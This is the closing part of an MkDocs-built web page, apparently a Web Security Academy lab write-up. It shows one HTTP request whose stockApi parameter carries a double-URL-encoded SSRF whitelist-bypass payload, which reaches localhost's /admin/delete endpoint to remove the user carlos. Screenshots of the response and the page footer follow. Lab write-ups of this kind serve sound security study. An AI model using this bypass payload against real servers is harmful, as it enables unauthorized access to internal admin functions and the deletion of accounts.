+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a50004a03d5fa49802e17930036002d</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">sG4EwlddbA7O8r0sUsLASHlVAHg6PC67</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a50004a03d5fa49802e17930036002d.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">stockApi</span><span class="o">=</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">flocalhost</span><span class="o">%</span><span class="mf">2523</span><span class="o">%</span><span class="mf">3</span><span class="nx">a11</span><span class="o">%</span><span class="mf">40</span><span class="nx">stock</span><span class="p">.</span><span class="nx">weliketoshop</span><span class="p">.</span><span class="nx">net</span><span class="o">%</span><span class="mf">3</span><span class="nx">a8080</span><span class="o">%</span><span class="mf">2</span><span class="nx">fadmin</span><span class="o">%</span><span class="mf">2</span><span class="nx">fdelete</span><span class="o">%</span><span class="mf">3</span><span class="nx">fusername</span><span class="o">%</span><span class="mf">3</span><span class="nx">dcarlos</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
